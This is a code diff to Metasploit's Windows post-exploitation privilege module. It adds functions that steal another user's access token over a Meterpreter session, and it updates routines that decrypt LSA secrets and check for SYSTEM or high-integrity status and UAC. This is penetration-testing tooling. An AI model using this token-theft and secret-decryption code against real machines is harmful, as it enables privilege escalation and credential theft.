@@ -43,6 +43,48 @@ module Msf::Post::Windows::Priv
     end
   end
 
+  # Steals the current user's token.
+  # @see steal_token
+  def steal_current_user_token
+    steal_token(get_env('COMPUTERNAME'), get_env('USERNAME'))
+  end
+
+  #
+  # Steals a token for a user.
+  # @param String computer_name Computer name.
+  # @param String user_name To token to steal from. If not set, it will try to steal
+  #                        the current user's token.
+  # @return [boolean] TrueClass if successful, otherwise FalseClass.
+  # @example steal_token(get_env('COMPUTERNAME'), get_env('USERNAME'))
+  #
+  def steal_token(computer_name, user_name)
+    pid = nil
+
+    session.sys.process.processes.each do |p|
+      if p['user'] == "#{computer_name}\\#{user_name}"
+        pid = p['pid']
+      end
+    end
+
+    unless pid
+      vprint_error("No PID found for #{user_name}")
+      return false
+    end
+
+    vprint_status("Stealing token from PID #{pid} for #{user_name}")
+
+    begin
+      session.sys.config.steal_token(pid)
+    rescue Rex::Post::Meterpreter::RequestError => e
+      # It could raise an exception even when the token is successfully stolen,
+      # so we will just log the exception and move on.
+      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+    end
+
+    true
+  end
+
+
   #
   # Returns true if in the administrator group
   #
@@ -64,12 +106,7 @@ module Msf::Post::Windows::Priv
   #
   def is_system?
     if session_has_ext
-      local_sys = resolve_sid(SYSTEM_SID)
-      if session.sys.config.getuid == "#{local_sys[:domain]}\\#{local_sys[:name]}"
-        return true
-      else
-        return false
-      end
+      return session.sys.config.is_system?
     else
       results = registry_enumkeys('HKLM\SAM\SAM')
       if results
@@ -90,7 +127,7 @@ module Msf::Post::Windows::Priv
     uac = false
     winversion = session.sys.config.sysinfo['OS']
 
-    if winversion =~ /Windows (Vista|7|8|2008|2012)/
+    if winversion =~ /Windows (Vista|7|8|2008|2012|10|2016|2019)/
       unless is_system?
         begin
           enable_lua = registry_getvaldata(
@@ -145,6 +182,14 @@ module Msf::Post::Windows::Priv
         end
       end
     end
+  end
+
+  #
+  # Returns true if in a high integrity, or system, service
+  #
+  def is_high_integrity?
+    il = get_integrity_level
+    (il == INTEGRITY_LEVEL_SID[:high] || il == INTEGRITY_LEVEL_SID[:system])
   end
 
   #
@@ -263,7 +308,7 @@ module Msf::Post::Windows::Priv
         md5x << pol[60,16]
       end
 
-      rc4 = OpenSSL::Cipher::Cipher.new("rc4")
+      rc4 = OpenSSL::Cipher.new("rc4")
       rc4.key = md5x.digest
       lsa_key  = rc4.update(pol[12,48])
       lsa_key << rc4.final
@@ -313,7 +358,7 @@ module Msf::Post::Windows::Priv
       sha256x << policy_secret[28,32]
     end
 
-    aes = OpenSSL::Cipher::Cipher.new("aes-256-cbc")
+    aes = OpenSSL::Cipher.new("aes-256-cbc")
     aes.key = sha256x.digest
 
     vprint_status("digest #{sha256x.digest.unpack("H*")[0]}")
@@ -346,7 +391,7 @@ module Msf::Post::Windows::Priv
       enc_block = secret[i..i+7]
       block_key = key[j..j+6]
       des_key = convert_des_56_to_64(block_key)
-      d1 = OpenSSL::Cipher::Cipher.new('des-ecb')
+      d1 = OpenSSL::Cipher.new('des-ecb')
 
       d1.padding = 0
       d1.key = des_key
